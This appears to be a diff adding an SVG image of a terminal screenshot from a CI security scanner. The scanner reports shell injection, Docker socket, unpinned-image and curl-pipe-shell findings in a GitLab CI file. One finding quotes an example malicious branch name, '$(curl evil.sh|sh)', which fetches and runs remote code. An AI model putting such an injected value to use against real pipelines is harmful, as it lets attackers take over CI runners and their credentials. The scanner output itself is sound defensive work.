@@ -1,0 +1,33 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="800" height="606" viewBox="0 0 800 606">
+<rect width="800" height="606" rx="8" fill="#1d2026"/>
+<g fill="#3a3f48"><circle cx="20" cy="18" r="5"/><circle cx="38" cy="18" r="5"/><circle cx="56" cy="18" r="5"/></g>
+<g font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="14" xml:space="preserve">
+<text y="52" style="white-space:pre"><tspan x="22.0" fill="#cdd3dc" >$ cicheck</tspan></text>
+<text y="71" style="white-space:pre"><tspan x="22.0" fill="#cdd3dc" >cicheck 0.1.0</tspan></text>
+<text y="90" style="white-space:pre"></text>
+<text y="109" style="white-space:pre"><tspan x="22.0" fill="#cdd3dc" >.gitlab-ci.yml  GitLab CI</tspan></text>
+<text y="128" style="white-space:pre"><tspan x="47.2" fill="#cdd3dc" >HIGH   Attacker-controlled variable used in a script  shell-injection</tspan></text>
+<text y="147" style="white-space:pre"><tspan x="72.4" fill="#cdd3dc" >.gitlab-ci.yml:11</tspan></text>
+<text y="166" style="white-space:pre"><tspan x="72.4" fill="#cdd3dc" >A branch name, commit message or MR/PR title is interpolated into a shell command.</tspan></text>
+<text y="185" style="white-space:pre"><tspan x="72.4" fill="#cdd3dc" >Someone can put shell code in that value (e.g. a branch named &quot;$(curl evil.sh|sh)&quot;)</tspan></text>
+<text y="204" style="white-space:pre"><tspan x="72.4" fill="#cdd3dc" >and have the runner execute it. Pass it through an intermediate environment variable</tspan></text>
+<text y="223" style="white-space:pre"><tspan x="72.4" fill="#cdd3dc" >and quote it.</tspan></text>
+<text y="242" style="white-space:pre"><tspan x="47.2" fill="#cdd3dc" >HIGH   Docker socket mounted into the job  docker-socket</tspan></text>
+<text y="261" style="white-space:pre"><tspan x="72.4" fill="#cdd3dc" >.gitlab-ci.yml:19</tspan></text>
+<text y="280" style="white-space:pre"><tspan x="72.4" fill="#cdd3dc" >Mounting /var/run/docker.sock gives the job full control of the host Docker daemon,</tspan></text>
+<text y="299" style="white-space:pre"><tspan x="72.4" fill="#cdd3dc" >which is root-equivalent on the runner. A compromised dependency in the job can take</tspan></text>
+<text y="318" style="white-space:pre"><tspan x="72.4" fill="#cdd3dc" >over the runner.</tspan></text>
+<text y="337" style="white-space:pre"><tspan x="47.2" fill="#cdd3dc" >MEDIUM   Unpinned container image  unpinned-image</tspan></text>
+<text y="356" style="white-space:pre"><tspan x="72.4" fill="#cdd3dc" >.gitlab-ci.yml:1</tspan></text>
+<text y="375" style="white-space:pre"><tspan x="72.4" fill="#cdd3dc" >The image has no fixed tag (or uses :latest), so the build can silently pull</tspan></text>
+<text y="394" style="white-space:pre"><tspan x="72.4" fill="#cdd3dc" >different, possibly malicious, contents over time. Pin a specific tag, ideally by</tspan></text>
+<text y="413" style="white-space:pre"><tspan x="72.4" fill="#cdd3dc" >@sha256 digest.</tspan></text>
+<text y="432" style="white-space:pre"><tspan x="47.2" fill="#cdd3dc" >MEDIUM   Pipes a downloaded script straight into a shell  curl-pipe-shell</tspan></text>
+<text y="451" style="white-space:pre"><tspan x="72.4" fill="#cdd3dc" >.gitlab-ci.yml:12</tspan></text>
+<text y="470" style="white-space:pre"><tspan x="72.4" fill="#cdd3dc" >The pipeline downloads a script and runs it immediately. Whatever the server returns</tspan></text>
+<text y="489" style="white-space:pre"><tspan x="72.4" fill="#cdd3dc" >at build time runs with the job&#x27;s credentials, and it can change after review. Pin</tspan></text>
+<text y="508" style="white-space:pre"><tspan x="72.4" fill="#cdd3dc" >and vendor what you run.</tspan></text>
+<text y="527" style="white-space:pre"></text>
+<text y="546" style="white-space:pre"><tspan x="22.0" fill="#cdd3dc" >1 CI file scanned</tspan></text>
+<text y="565" style="white-space:pre"><tspan x="22.0" fill="#cdd3dc" >2 high  2 medium</tspan></text>
+</g></svg>
